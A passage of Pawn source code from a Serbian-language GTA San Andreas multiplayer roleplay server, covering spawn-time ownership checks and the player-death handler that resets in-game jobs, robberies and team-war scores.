			        PlayerInfo[ playerid ][ xVoziloID ][ 0 ]=-1;
			        SavePlayer( playerid );
			    }
			}
			if( PlayerInfo[ playerid ][ xVoziloID ][ 1 ] != -1 ) {

			    if(strcmp( VehicleInfo[ PlayerInfo[ playerid ][ xVoziloID ][ 1 ] ][ vOwner ], ImeIgraca( playerid ), true ) ) {

                    SCM( playerid, ANTICHEAT, "| V:AC | Vozilo 2 vise nije u vasem vlasnistvu, obratite se na forumu ako mislite je greska." );
			        PlayerInfo[ playerid ][ xVoziloID ][ 1 ] = -1;
			        SavePlayer( playerid );
			    }
			}
			if( PlayerInfo[ playerid ][ xVoziloID ][ 2 ] != -1 ) {

			    if(strcmp( VehicleInfo[ PlayerInfo[ playerid ][ xVoziloID ][ 2 ] ][ vOwner ], ImeIgraca( playerid ), true ) ) {

                    SCM( playerid, ANTICHEAT, "| V:AC | Vozilo 3 vise nije u vasem vlasnistvu, obratite se na forumu ako mislite je greska." );
			        PlayerInfo[ playerid ][ xVoziloID ][ 2 ] = -1;
			        SavePlayer( playerid );
			    }
			}
			if( PlayerInfo[ playerid ][ xVoziloID ][ 3 ] != -1 ) {

			    if(strcmp( VehicleInfo[ PlayerInfo[ playerid ][ xVoziloID ][ 3 ] ][ vOwner ], ImeIgraca( playerid ), true ) ) {

                    SCM( playerid, ANTICHEAT, "| V:AC | Vozilo 4 vise nije u vasem vlasnistvu, obratite se na forumu ako mislite je greska." );
			        PlayerInfo[ playerid ][ xVoziloID ][ 3 ] = -1;
			        SavePlayer( playerid );
			    }
			}
			
			if( PlayerInfo[ playerid ][ xProperty ][ 0 ] != -1 ) {

			    if( strcmp( II[ PlayerInfo[ playerid ][ xProperty ][ 0 ] ][ iOwner ], ImeIgraca( playerid ), true ) ) {

                    SCM( playerid, ANTICHEAT, "| V:AC | Imovina 1 vise nije u vasem vlasnistvu, obratite se na forumu ako mislite je greska." );
			        PlayerInfo[ playerid ][ xProperty ][ 0 ] = -1;
			        SavePlayer( playerid );
			    }
			}
			if( PlayerInfo[ playerid ][ xProperty ][ 1 ] != -1 ) {

			    if( strcmp( II[ PlayerInfo[ playerid ][ xProperty ][ 1 ] ][ iOwner ], ImeIgraca( playerid ), true ) ) {

                    SCM( playerid, ANTICHEAT, "| V:AC | Imovina 2 vise nije u vasem vlasnistvu, obratite se na forumu ako mislite je greska." );
			        PlayerInfo[ playerid ][ xProperty ][ 1 ] = -1;
			        SavePlayer( playerid );
			    }
			}
			if( PlayerInfo[ playerid ][ xProperty ][ 2 ] != -1 ) {

			    if( strcmp( II[ PlayerInfo[ playerid ][ xProperty ][ 2 ] ][ iOwner ], ImeIgraca( playerid ), true ) ) {

                    SCM( playerid, ANTICHEAT, "| V:AC | Imovina 3 vise nije u vasem vlasnistvu, obratite se na forumu ako mislite je greska." );
			        PlayerInfo[ playerid ][ xProperty ][ 2 ] = -1;
			        SavePlayer( playerid );
			    }
			}
            if( PlayerInfo[playerid][xWorkShopID] != -1) {

                if(strcmp(BitcoinInfo[PlayerInfo[playerid][xWorkShopID]][bVlasnik], ImeIgraca(playerid), true)) {

                    SCM( playerid, ANTICHEAT, "| V:AC | Bitcoin Workshop vise nije u vasem vlasnistvu, obratite se na forumu ako mislite je greska." );
                    PlayerInfo[ playerid ][ xWorkShopID ] = -1;
                    SavePlayer( playerid );
                }
            }
            if( PlayerInfo[playerid][xWorkShopGarage] != -1) {

                if(strcmp(WorkShopInfo[PlayerInfo[playerid][xWorkShopGarage]][wVlasnik], ImeIgraca(playerid), true)) {

                    SCM( playerid, ANTICHEAT, "| V:AC | Radionica vise nije u vasem vlasnistvu, obratite se na forumu ako mislite je greska." );
                    PlayerInfo[ playerid ][ xWorkShopGarage ] = -1;
                    SavePlayer( playerid );
                }
            }
            if( PlayerInfo[playerid][xNaftaID] != -1) {

                if(strcmp(NaftaInfo[PlayerInfo[playerid][xNaftaID]][pVlasnik], ImeIgraca(playerid), true)) {

                    SCM( playerid, ANTICHEAT, "| V:AC | Naftna Platforma vise nije u vasem vlasnistvu, obratite se na forumu ako mislite je greska." );
                    PlayerInfo[ playerid ][ xNaftaID ] = -1;
                    SavePlayer( playerid );
                }
            }
            if( PlayerInfo[playerid][xPosadioDrogu] != 0) {

                if(strcmp(PlantazaInfo[PlayerInfo[playerid][xPosadioDrogu]][drogaPosadio], ImeIgraca(playerid), true)) {

                    PlayerInfo[playerid][xPosadioDrogu] = 0;
                    SavePlayer(playerid);
                }
            }
			
		}
        PrviSpawn[ playerid ] = 0;
	}
    if( PlayerInfo[ playerid ][ xBStil ] == 0) { SetPlayerFightingStyle ( playerid, FIGHT_STYLE_NORMAL); }
	else if( PlayerInfo[ playerid ][ xBStil ] == 1) { SetPlayerFightingStyle ( playerid, FIGHT_STYLE_BOXING); }
	else if( PlayerInfo[ playerid ][ xBStil ] == 2) { SetPlayerFightingStyle ( playerid, FIGHT_STYLE_KUNGFU); }
	else if( PlayerInfo[ playerid ][ xBStil ] == 3) { SetPlayerFightingStyle ( playerid, FIGHT_STYLE_KNEEHEAD); }
	else if( PlayerInfo[ playerid ][ xBStil ] == 4) { SetPlayerFightingStyle ( playerid, FIGHT_STYLE_GRABKICK); }

    SetPlayerSkillLevel( playerid, WEAPONSKILL_DESERT_EAGLE, 999 );
	SetPlayerSkillLevel( playerid, WEAPONSKILL_MP5, 999 );
	SetPlayerSkillLevel( playerid, WEAPONSKILL_AK47, 999 );
	SetPlayerSkillLevel( playerid, WEAPONSKILL_M4, 999 );
    SetPlayerSkillLevel(playerid, WEAPONSKILL_PISTOL, 999);
    SetPlayerSkillLevel(playerid, WEAPONSKILL_SNIPERRIFLE, 999);
    SetPlayerSkillLevel(playerid, WEAPONSKILL_PISTOL_SILENCED, 999);
    SetPlayerSkillLevel(playerid, WEAPONSKILL_SHOTGUN, 999);
    SetPlayerSkillLevel(playerid, WEAPONSKILL_SAWNOFF_SHOTGUN, 999);
    SetPlayerSkillLevel(playerid, WEAPONSKILL_SPAS12_SHOTGUN, 999);
    SetPlayerSkillLevel(playerid, WEAPONSKILL_MICRO_UZI, 999);

	RemovePlayerAttachedObject( playerid, OBJECT_SLOT_RHAND );
	RemovePlayerAttachedObject( playerid, OBJECT_NOSI );
	RemovePlayerAttachedObject( playerid, OBJECT_SLOT_LHAND );
	RemovePlayerAttachedObject( playerid, OBJECT_SLOT_HELMET );
	RemovePlayerAttachedObject( playerid, OBJECT_SLOT_MASK );
	RemovePlayerAttachedObject( playerid, OBJECT_SLOT_BADGE );
	RemovePlayerAttachedObject( playerid, OBJECT_SLOT_BACKPACK );

	if( HeadOn[ playerid ] ) SetPlayerAttachedObject( playerid, OBJECT_SLOT_HEAD, PlayerInfo[ playerid ][ xHead ],2,PlayerInfo[ playerid ][ xHeadPos ][ 0 ],PlayerInfo[ playerid ][ xHeadPos ][ 1 ],PlayerInfo[ playerid ][ xHeadPos ][ 2 ],PlayerInfo[ playerid ][ xHeadPos ][ 3 ],PlayerInfo[ playerid ][ xHeadPos ][ 4 ],PlayerInfo[ playerid ][ xHeadPos ][ 5 ],PlayerInfo[ playerid ][ xHeadPos ][ 6 ],PlayerInfo[ playerid ][ xHeadPos ][ 7 ],PlayerInfo[ playerid ][ xHeadPos ][ 8 ], 0, 0);
    if( SungOn[ playerid ] ) {
		SetPlayerAttachedObject( playerid, OBJECT_SLOT_MASKSUNGL, PlayerInfo[ playerid ][ xSungMask ],2,PlayerInfo[ playerid ][ xSungMaskPos ][ 0 ],PlayerInfo[ playerid ][ xSungMaskPos ][ 1 ],PlayerInfo[ playerid ][ xSungMaskPos ][ 2 ],PlayerInfo[ playerid ][ xSungMaskPos ][ 3 ],PlayerInfo[ playerid ][ xSungMaskPos ][ 4 ],PlayerInfo[ playerid ][ xSungMaskPos ][ 5 ],PlayerInfo[ playerid ][ xSungMaskPos ][ 6 ],PlayerInfo[ playerid ][ xSungMaskPos ][ 7 ],PlayerInfo[ playerid ][ xSungMaskPos ][ 8 ], 0, 0);
	}
	if( FaceOn[ playerid ] ) SetPlayerAttachedObject( playerid, OBJECT_SLOT_BANDANA, PlayerInfo[ playerid ][ xFace ],2,PlayerInfo[ playerid ][ xFacePos ][ 0 ],PlayerInfo[ playerid ][ xFacePos ][ 1 ],PlayerInfo[ playerid ][ xFacePos ][ 2 ],PlayerInfo[ playerid ][ xFacePos ][ 3 ],PlayerInfo[ playerid ][ xFacePos ][ 4 ],PlayerInfo[ playerid ][ xFacePos ][ 5 ],PlayerInfo[ playerid ][ xFacePos ][ 6 ],PlayerInfo[ playerid ][ xFacePos ][ 7 ],PlayerInfo[ playerid ][ xFacePos ][ 8 ], 0, 0);
	
	PlayerCuffed[ playerid ] = 0; PoliceDuty[ playerid ] = false;
	NosiObjekt[ playerid ][ 0 ] = false; NosiObjekt[ playerid ][ 1 ] = false; NosiObjekt[ playerid ][ 2 ] = false;
  	Trucker[ playerid ][ tHasCargo ] = false; UzeoPicu[ playerid ] = false;
	NosiPaketOruzja[ playerid ] = false; garbagemanInfo[ playerid ][ gmiHasGarbage ] = false;
	farmerInfo[ playerid ][ fiHaveBucket ] = false; RiotShield[ playerid ] = false;
	Dinamit[ playerid ] = false; LaptopRuke[ playerid ] = false;
	PuniGorivo[ playerid ] = false; IgracZavezan[ playerid ] = false;

	Maskuse[ playerid ] = false;

    if( PlayerBuyingAS[ playerid ] != -1 ) {
 	    AutoSalon[ PlayerBuyingAS[ playerid ] ][ AlreadyBuying ] = false;
 	    PlayerBuyingAS[ playerid ] = -1;
	}

	farmerInfo[ playerid ][ fiCowNumber ] = 0;
    if( farmerInfo[ playerid ][ fiVehicleBucket ] != -1 ) {
		new farmvehicle = farmerInfo[ playerid ][ fiVehicleBucket ];

		farmerVehicles[ farmvehicle ][ fvMilk ] = false;
    	farmerVehicles[ farmvehicle ][ fvMilkpID ] = -1;
	}

	SetPlayerSkillLevel( playerid, WEAPONSKILL_PISTOL, 1 );
    SetPlayerSkillLevel( playerid, WEAPONSKILL_MICRO_UZI, 1 );

    SetPlayerSpecialAction( playerid, SPECIAL_ACTION_NONE );
	
	Novi_KillTimer( atmrobTimer[ playerid ] );

	if( PlayerInfo[ playerid ][ xRPLearn ] == 1 ) {
       	TimerLearn[ playerid ] = SetTimerEx( "CityTut", 3000, 0, "ii", playerid, 1);
 		SCM( playerid, SVETLOCRVENA, "Nisi zavrsio tutorijal, pa si ponovno vracen da ga odgledas!" );
	}

    if( PlayerInfo[ playerid ][ xZatvor ] == OBICAN_ZATVOR ) {
		if( PlayerInfo[ playerid ][ xLeaveJail ] == true ) {
		    SendClientMessageEx( playerid, SRVBOJA1, "JAIL:"col_white" %s stavljen si u jail na %d minuta i izgubio si %d$!", ImeIgraca( playerid ), PlayerInfo[ playerid ][ xZatvorVreme ], ((PlayerInfo[ playerid ][ xZatvorVreme ]/10)*1000) );
	        SCM( playerid, SRVBOJA1, "JAIL:"col_white" RAZLOG: 'Izalazak sa servera sa Wanted Levelom'");
		    PlayerInfo[ playerid ][ xLeaveJail ] = false;
		}
	}

	if( PlayerInfo[ playerid ][ xZatvor ] == OBICAN_ZATVOR ) {
		if( strlen( PlayerInfo[ playerid ][ xOffPJail ] ) > 2 ) {
		    SendClientMessageEx( playerid, SRVBOJA1, "OFFLINE JAIL:"col_white" %s je stavljen u jail na %d minuta od strane Admin TEAM-a!", ImeIgraca( playerid ), PlayerInfo[ playerid ][ xZatvorVreme ] );
	        SendClientMessageEx( playerid, SRVBOJA1, "OFFLINE JAIL:"col_white" RAZLOG: '%s'", PlayerInfo[ playerid ][ xOffPJail ] );
			strmid( PlayerInfo[ playerid ][ xOffPJail ], "N", 0, strlen("N"), 2 );
		}
	}
	if( PlayerInfo[ playerid ][ xMute ] > 0 ) {
		if( strlen( PlayerInfo[ playerid ][ xOffPMute ] ) > 2 ) {
		    SendClientMessageEx( playerid, SRVBOJA1, "OFFLINE MUTE:"col_white" %s je mutiran na %d minuta od strane Admin TEAM-a!", ImeIgraca( playerid ), PlayerInfo[ playerid ][ xMute ]/60 );
	        SendClientMessageEx( playerid, SRVBOJA1, "OFFLINE MUTE:"col_white" RAZLOG: '%s'", PlayerInfo[ playerid ][ xOffPMute ] );
			strmid( PlayerInfo[ playerid ][ xOffPMute ], "N", 0, strlen("N"), 2 );
		}
	}
	if( PlayerInfo[ playerid ][ xZatvor ] == ALKATRAZ ) {
		if( strlen( PlayerInfo[ playerid ][ xOffPPrison ] ) > 2 ) {
		    SendClientMessageEx( playerid, SRVBOJA1, "OFFLINE PRISON:"col_white" %s je stavljen u prison na %dh od strane Admin TEAM-a!", ImeIgraca( playerid ), PlayerInfo[ playerid ][ xZatvorVreme ]/60 );
	        SendClientMessageEx( playerid, SRVBOJA1, "OFFLINE PRISON:"col_white" RAZLOG: '%s'", PlayerInfo[ playerid ][ xOffPPrison ] );
			strmid( PlayerInfo[ playerid ][ xOffPPrison ], "N", 0, strlen("N"), 2 );
		}
	}
	
	if( SpecPos[ playerid ][ 0 ] != 0.0 && SpecPos[ playerid ][ 1 ] != 0.0 ) {
	    Novi_SetPlayerPos( playerid, SpecPos[ playerid ][ 0 ], SpecPos[ playerid ][ 1 ],  SpecPos[ playerid ][ 2 ] );
       	SetPlayerVirtualWorld( playerid, SpecVW[ playerid ] );
       	SetPlayerInterior( playerid, SpecInt[ playerid ] );
       	
       	if( PlayerInfo[ playerid ][ xAdmin ] > 0 && PlayerInfo[ playerid ][ xAdmin ] < 7 && PlayerInfo[ playerid ][ xPol ] == 1 ) {
			PostaviSkin( playerid, 294 );
		}
		else if( PlayerInfo[ playerid ][ xSupporter ] > 0 && PlayerInfo[ playerid ][ xPol ] == 1 ) {
			PostaviSkin( playerid, 59 );
		}
       	
       	SpecPos[ playerid ][ 0 ] = 0.0;
       	SpecPos[ playerid ][ 1 ] = 0.0;
       	SpecPos[ playerid ][ 2 ] = 0.0;
	}

    if(PlayerInfo[playerid][xParadox] == 1) {

        SendInfoMessage(playerid, "Vracas se u paradox!");

        createParadox(playerid);

        return 1;
    }

	return true;
}

public OnPlayerDeath( playerid, killerid, reason ) {

    if(IsPlayerNPC(playerid)) return 1;

    if(PubgPokrenut) {

        if(PubgIgra[playerid]) {

            stopPubgPlayer(playerid);

            if(PubgIgraci == 1) {

                new pobednik;
                foreach(Player, i) {

                    if(PubgIgra[i]) pobednik = i;
                }

                PubgMessageAll("Pobednik PUBG Eventa je %s! Nagrada : %d", ImeIgraca(pobednik), PubgNagrada);
                DajIgracuNovac(pobednik, PubgNagrada);
                stopPubgPlayer(pobednik);
                stopPubg();
            }
            else {

                PubgMessageAll("Igrac %s je umro! Preostalo Igraca : %d", ImeIgraca(playerid), PubgIgraci);
            }

        }
    }

    if(KoristiKran[playerid]) {

        KoristiKran[playerid] = false;
        KranUpotreba = false;
    }

    if(WorkShopBuyModel[playerid] != 0) {
    
        resetWorkshopBuying(playerid);
    }

    if(robaOrganizacijuTime[playerid] >= 1) {

        prekinuoOrgRob[playerid] = true;
        robaOrganizacijuTime[playerid] = 0;
        robaOrganizaciju[playerid] = -1;

        SendInfoMessage(playerid, "Umro si dok si pljackao organizaciju!");
    }

    if(misijaKradja[playerid] >= 1) {

        Novi_DisablePlayerCheckpoint(playerid);

        radiMisiju[playerid] = 0;
        misijaKradja[playerid] = 0;

        ResetPlayerWeapons(playerid);
    }

    if(misijaUbistvo[playerid] >= 1) {

        Novi_DisablePlayerCheckpoint(playerid);

        radiMisiju[playerid] = 0;
        misijaCounter[playerid] = 0;
        misijaUbistvo[playerid] = 0;
    }

    if(misijaVraca[playerid] || misijaNosi[playerid]) {

        Novi_DisablePlayerCheckpoint(playerid);

        radiMisiju[playerid] = 0;
        misijaCounter[playerid] = 0;
        misijaVraca[playerid] = false;
        misijaNosi[playerid] = false;
    }

    if(radiPaparazo[playerid]) {

        zaustaviPaparazo(playerid);
        SendInfoMessage(playerid, "Umro si radeci paparazo misiju!");
    }

    if (playerid != INVALID_PLAYER_ID && killerid != INVALID_PLAYER_ID)
    {
        deathCount ++;

        if (deathCount <= 5)
        {
            // Formatiranje iksica
            new str[21];
            str[0] = EOS;
            for (new i = 0; i < deathCount; i++)
            {
                format(str, sizeof str, "%sx~N~", str);
            }
            // Nakon 5 ubistava, vise se nece ni formatirati, vec ce ih uvek biti 5 (iksica)
            TextDrawSetString(tdDeathList[1], str);
        }
        if (deathCount > 5)
        {
            // Preko 5 smrti, brisemo prvo ime, pa tek onda dodajemo novo na kraj
            new delPos; 

            delPos = strfind(killerList, "~N~") + 3; // "+3" jer brise celo "~N~"
            strdel(killerList, 0, delPos);

            delPos = strfind(victimList, "~N~") + 3; // "+3" jer brise celo "~N~"
            strdel(victimList, 0, delPos);
        }

        new sati,minuti,sekunde;
        gettime(sati, minuti, sekunde);
        new stringic[16];
        format(stringic, sizeof stringic, "%s%d:%s%d:%s%d", (sati < 10) ? ("0") : (""), sati, (minuti < 10) ? ("0") : (""), minuti, (sekunde < 10) ? ("0") : (""), sekunde);
        
        format(killerList, sizeof killerList, "%s(%s)%s~N~", killerList, stringic, ImeIgraca(killerid));
        TextDrawSetString(tdDeathList[0], killerList);

        format(victimList, sizeof victimList, "%s%s~N~", victimList, ImeIgraca(playerid));
        TextDrawSetString(tdDeathList[2], victimList);
    }

    if(radiPilot[playerid] >= 1) {

        DisablePlayerCheckpoint(playerid);

        radiPilot[ playerid ] = 0;
        if(IsValidVehicle(pilotVozilo[playerid]))
            Novi_DestroyVehicle(pilotVozilo[playerid]);
        pilotVozilo[playerid] = -1;

        PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
        UzeoOpremu[ playerid ] = false;
    }

    if(radiElektricar[playerid] >= 1) {

        if(IsValidVehicle(elektricarVozilo[playerid]))
            Novi_DestroyVehicle(elektricarVozilo[playerid]);

        elektricarVozilo[playerid] = -1;

        DisablePlayerCheckpoint(playerid);

        radiElektricar[playerid] = 0;
        elektricarTDShow(playerid, false);

        PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
        UzeoOpremu[ playerid ] = false;
    }

    if(prevoziDrva[playerid] >= 1) {

        DisablePlayerCheckpoint(playerid);

        prevoziDrva[ playerid ] = 0;
        if(IsValidVehicle(posaoDrvaVozilo[playerid]))
            Novi_DestroyVehicle(posaoDrvaVozilo[playerid]);

        // if(IsValidDynamicObject(posaoDrvaObjekat[playerid]))
        //     DestroyDynamicObject(posaoDrvaObjekat[playerid]);
        posaoDrvaVozilo[playerid] = -1;
        PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
        UzeoOpremu[ playerid ] = false;
    }

    if( KrenuoKosenje[playerid] ) {

        DisablePlayerCheckpoint(playerid);
    
        PokosenaTrava[ playerid ] = 0;
        KrenuoKosenje[ playerid ] = false;

        Novi_DestroyVehicle(kosacVozilo[playerid]);
        kosacVozilo[playerid] = -1;
        TogglePlayerControllable( playerid, true );

        PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
        UzeoOpremu[ playerid ] = false;
    }

    if(radiPorno[playerid]) {

        radiPorno[playerid] = false;
        pornoCooldown[playerid] = 60;
        pornoProgress[playerid] = 0.0;
        KrevetUpotreba = false;

        TogglePlayerControllable(playerid, 1);

        ClearAnimations(playerid);

        DestroyPlayerProgressBar(playerid, PornoBar[playerid]);
        PornoBar[playerid] = INVALID_PLAYER_BAR_ID;

        PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
        UzeoOpremu[ playerid ] = false;
    }


    if(radiLovac[playerid]) {

        radiLovac[playerid] = false;
        lovacCounter[playerid] = 0;

        ResetAllWeapons(playerid);

        PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
        UzeoOpremu[ playerid ] = false;
    }

    if(radiAstronaut[playerid]) {

        radiAstronaut[playerid] = false;
        astronautCP[playerid] = 0;

        if(astronautTDShowed[playerid]) 
            astronautTDShow(playerid, false);
        astronautKey[playerid] = 0;
        astronautPopravkaBroj[playerid] = 0;

        Novi_DisablePlayerCheckpoint(playerid);

        PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
        UzeoOpremu[ playerid ] = false;

        if( IsPlayerAttachedObjectSlotUsed( playerid, OBJECT_SLOT_HEAD ) ) RemovePlayerAttachedObject( playerid, OBJECT_SLOT_HEAD );

        SetPlayerTime( playerid, ServerInfo[ VremeInGame ], 0 );
        SetPlayerWeather( playerid, ServerInfo[ Prognozasys ] );

        PortajIgraca(playerid, 208.0606,1740.7100,17.6025);
    }

    if(playerHacking[playerid] >= 1) {

        playerHacking[playerid] = 0;
        playerHackingNosi[playerid] = false;

        Novi_DisablePlayerCheckpoint(playerid);

        PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
        UzeoOpremu[ playerid ] = false;
    }

    if(RadiDelivery[playerid]) {

        Novi_DisablePlayerCheckpoint(playerid);
        DeliveryCP[playerid] = 0;
        RadiDelivery[playerid] = false;

        Novi_DestroyVehicle(DeliveryVozilo[playerid]);
        DeliveryVozilo[playerid] = -1;

        PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
        UzeoOpremu[ playerid ] = false;
    }

    if(PosaoRudar[ playerid ] != 0) {

        Novi_DisablePlayerCheckpoint(playerid);
        CheckpointStatus[ playerid ] = 0;
        PosaoRudar[ playerid ] = 0;
        rudarPosao[ playerid ][ rudarIskopano ] = 0;

        PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
        UzeoOpremu[ playerid ] = false;
    }

    if(RadiSabotazer{playerid}) {

        Novi_DisablePlayerCheckpoint(playerid);

        Novi_DestroyVehicle(SabotazerVozilo[playerid]);
        SabotazerVozilo[playerid] = -1;

        SabotazerPosloviCP{playerid} = 0;
        RadiSabotazer{playerid} = false;

        PricaSabotazerTimer{playerid} = 0;
        SabotazerVozilo[playerid] = 0;
        UbioKapetana2{playerid} = 0;
        UbioKapetana1{playerid} = 0;
        UpucaKapetana{playerid} = 0;

        PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
        UzeoOpremu[ playerid ] = false;
    }

    if(RadiMoler[playerid]) {

        Novi_SetPlayerPos(playerid, -1685.6660,1035.8398,45.2109);
        SetPlayerVirtualWorld(playerid, 0);
        TogglePlayerControllable(playerid, false);
        ClearAnimations(playerid);
        defer UcitavanjeTimer(playerid);

        for(new obj = 0; obj < 8; obj++) {

            DestroyPlayerObject(playerid, MolerZid[obj][playerid]);
        }

        RadiMoler[playerid] = false;
        MolerCP[playerid] = 0;

        PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
        UzeoOpremu[ playerid ] = false;
    }

    if(NosiBankaTorbu[playerid]) {

        SendInfoMessage(playerid, "Nisi uspeo da odneses torbu!");
        RemovePlayerAttachedObject(playerid, OBJECT_SLOT_BADGE);
        DisablePlayerCheckpoint(playerid);
        NosiBankaTorbu[playerid] = false;

        new Float:IgracPosX, Float:IgracPosY, Float:IgracPosZ;
        GetPlayerPos(playerid, IgracPosX, IgracPosY, IgracPosZ);
        defer KreirajBankaPickup(Float:IgracPosX, Float:IgracPosY, Float:IgracPosZ);
        //TorbaBankaPickup = CreateDynamicPickup(1550, 1, PosI[0], PosI[1], PosI[2], -1, -1, -1, STREAMER_PICKUP_SD, -1, 0);
    }

    if(RobaBanku[playerid]) {

        stop TimerRobBanka;

        UnistiBusilicu();
        UnistiNovac();

        BankaBusilicaTDSakrij(playerid);

        PostaviBusilicu[playerid] = false;
        BusilicaTime[playerid] = 0;
        BankaUToku = false;
        BankaOrobana = true;
        RobaBanku[playerid] = false;
        PokupiTorbu[playerid] = false;
        PostaviBusilicu[playerid] = false;

        defer SledeciRobBanke();

        SendClientMessageToAll(-1, ""SRVBOJA1SCM"====================================="col_white" [ VANDREDNE VESTI ] "SRVBOJA1SCM"=====================================");
        SendClientMessageToAll(-1, ""SRVBOJA1SCM"REPORTER: "col_white"Obavestavamo gradjane da je policija uspesno sprecila pljacku "SRVBOJA1SCM"BANKE"col_white"!");
        SendClientMessageToAll(-1, ""SRVBOJA1SCM"REPORTER: "col_white"Za svoje dobro delo, grad ih nagradjuje novcanom nagradom od "SRVBOJA1SCM"15.000$"col_white" svakom clanu Policije!");
        SendClientMessageToAll(-1, ""SRVBOJA1SCM"===============================================================================================================");

        foreach( Player, i ) {

            if( IsPlayerConnected( i ) ) {
                
                if(ClanPolicije(i) && !isPlayerAFK(i)) {

                    DajIgracuNovac(i, 15000);
                    SendInfoMessage(i, "Za uspesno sprecavanje pljacke dobio si 15.000$!");
                }
            }
        }

    }

    if(radiVojnik2[playerid]) {

        VojnikMessage(playerid, "Umro si dok si radio posao vojnik!");
        Novi_DisablePlayerCheckpoint(playerid);
        ResetPlayerWeapons(playerid);
        Novi_SetPlayerArmour(playerid, 0);

        Ubio1[playerid] = false;
        Ubio2[playerid] = false;
        vojnik2Obj[playerid] = -1;
        GeneralTimer2[playerid] = 0;
        radiVojnik2[playerid] = false;
        vojnik2CP[playerid] = 0;
        vojnik2Veh[playerid] = -1;

        UzeoOpremu[playerid] = false;
        PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
    }

    if(PlayerInfo[playerid][xParadox] == 1) {

        SendInfoMessage(playerid, "Vracas se u paradox!");

        createParadox(playerid);

        return 1;
    }

    if(GetPVarInt(playerid,"roped") == 1)
    {
        for(new destr2=0;destr2<=ropelength;destr2++)
        {
            DestroyDynamicObject(r0pes[playerid][destr2]);
        }
        SetPVarInt(playerid,"roped",0);
        Novi_DisablePlayerCheckpoint(playerid);
    }

    if(RanjenIgrac[playerid]) {

        RanjenIgrac[playerid] = false;
        stop RanjenIgracTimer;
        TextDrawHideForPlayer(playerid, PozadinaTD);
    }

    for(new w = 0; w < MAX_WARS; w ++) {
        if( killerid != INVALID_PLAYER_ID ) {
            if( WARInfo[ w ][ warActive ] == true && WARPInfo[ playerid ][ warID ] == w && WARPInfo[ killerid ][ warID ] == w ) {
                WARPInfo[ killerid ][ warKills ]++;
                WARPInfo[ playerid ][ warDeaths ]++;
                if( WARPInfo[ playerid ][ warTeam ][ 0 ] == true && WARPInfo[ killerid ][ warTeam ][ 0 ] == true ) {
                    WARInfo[ w ][ warTeamScore ][ 0 ] -= 3;
                    format( globalstring, sizeof( globalstring ), ""COL_ORANGE"WAR "COL_WHITE"| "COL_TEAM1"%s "COL_WHITE"je ubio saigraca "COL_TEAM1"%s, "COL_WHITE"i tim je izgubio 3 poena.", ImeIgraca( killerid ), ImeIgraca( playerid ) );
                    WARMessage( w, -1, globalstring );
                    SetWarStatsTD( w );
                }
                if( WARPInfo[ playerid ][ warTeam ][ 1 ] == true && WARPInfo[ killerid ][ warTeam ][ 1 ] == true ) {
                    WARInfo[ w ][ warTeamScore ][ 1 ] -= 3;
                    format( globalstring, sizeof( globalstring ), ""COL_ORANGE"WAR "COL_WHITE"| "COL_TEAM2"%s "COL_WHITE"je ubio saigraca "COL_TEAM2"%s, "COL_WHITE"i tim je izgubio 3 poena.", ImeIgraca( killerid ), ImeIgraca( playerid ) );
                    WARMessage( w, -1, globalstring);
                    SetWarStatsTD( w );
                }
                if( WARPInfo[ killerid ][ warTeam ][ 0 ] == true && WARPInfo[ playerid ][ warTeam ][ 1 ] == true ) {
                    WARInfo[ w ][ warTeamScore ][ 0 ]++;
                    format( globalstring, sizeof( globalstring ), ""COL_ORANGE"WAR "COL_WHITE"| "COL_TEAM1"%s "COL_WHITE"je ubio protivnika "COL_TEAM2"%s.", ImeIgraca( killerid ), ImeIgraca( playerid ) );
                    WARMessage( w, -1, globalstring );
                    SetWarStatsTD( w );
                }
                if( WARPInfo[ killerid ][ warTeam ][ 1 ] == true && WARPInfo[ playerid ][ warTeam ][ 0 ] == true ) {
                    WARInfo[ w ][ warTeamScore ][ 1 ]++;
                    format( globalstring, sizeof( globalstring ), ""COL_ORANGE"WAR "COL_WHITE"| "COL_TEAM2"%s "COL_WHITE"je ubio protivnika "COL_TEAM1"%s.", ImeIgraca( killerid ), ImeIgraca( playerid ) );
                    WARMessage( w, -1, globalstring );
                    SetWarStatsTD( w );
                }
                return true;
            }
        }
    }

    if(!NaDmEventu[playerid]) {
        if(WARPInfo[ playerid ][ warID ] != -1) return 1;
        WastedTDControl(playerid, true);
    }

    if(ProdajeKokain[playerid] >= 1) {

        SendInfoMessage(playerid, "Zbog smrti nisi uspeo da zavrsis prodaju kokaina!");

        FavellaVreme = ProdajeKokain[playerid];

        UmroKoks[playerid] = true;
        ProdajeKokain[playerid] = 0;
        ProdajeKokainRange[playerid] = 0;

        FavellaTDControl(playerid, false);

        new Float:IgracPosX, Float:IgracPosY, Float:IgracPosZ;
        GetPlayerPos(playerid, IgracPosX, IgracPosY, IgracPosZ);
        defer KreirajFavellaPickup(Float:IgracPosX, Float:IgracPosY, Float:IgracPosZ);
    }

    if(TrenutniKokain[playerid] >= 1) {

        SendInfoMessage(playerid, "Zbog smrti ti je ispao ubrani kokain!");

        TrenutniKokain[playerid] = 0;
    }

    if(NosiSliku[playerid]) {

        SendInfoMessage(playerid, "Nisi uspeo da odneses sliku!");
        Novi_DisablePlayerCheckpoint(playerid);
        NosiSliku[playerid] = false;

        if(MuzejPokrenut && ClanIlegalaca(killerid)) {

            new Float:IgracPosX, Float:IgracPosY, Float:IgracPosZ;
            GetPlayerPos(playerid, IgracPosX, IgracPosY, IgracPosZ);
            defer KreirajMuzejPickup(Float:IgracPosX, Float:IgracPosY, Float:IgracPosZ);
            //MuzejSlikaPickup = CreateDynamicPickup(1550, 1, IgracPos[0], IgracPos[1], IgracPos[2], -1, -1, -1, STREAMER_PICKUP_SD, -1, 0);
        }

        else {

            KreirajSliku();
            SendClientMessageToAll(-1, ""col_red"====================================="col_white" [ VANDREDNE VESTI ] "col_red"=====================================");
